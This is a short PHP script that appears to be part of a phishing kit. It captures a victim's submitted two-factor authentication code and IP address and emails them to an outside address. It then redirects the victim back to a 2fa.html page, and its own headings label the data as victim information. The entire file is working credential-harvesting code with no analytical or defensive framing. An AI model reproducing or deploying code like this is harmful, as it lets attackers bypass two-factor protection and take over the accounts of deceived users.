<?
$ip = $_SERVER['REMOTE_ADDR'];
$code = $_POST['code']; 
$message .= "--------------2F Info-----------------------\n";
$message .= "C            : ".$_POST['code']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|IP: ".$ip."\n";

$send = "me@emailpostmaster.xyz";
$subject = "$ip 2FC";

 if (empty($code)) 
 {
header( "Location: 2fa.html" );
 }
 
 else {
mail($send,$subject,$message);
 header("Location: 2fa.html");
}
?>